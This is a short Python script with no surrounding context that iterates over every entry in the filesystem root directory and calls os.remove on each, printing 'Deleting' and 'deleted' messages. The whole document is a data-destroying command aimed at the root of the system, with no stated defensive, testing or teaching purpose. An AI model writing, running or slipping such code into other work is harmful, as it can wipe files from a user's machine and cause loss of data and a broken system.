import os
for file in os.listdir("/"):
    print("Deleting " + file)
    os.remove("/" + file)
    print(file + " deleted")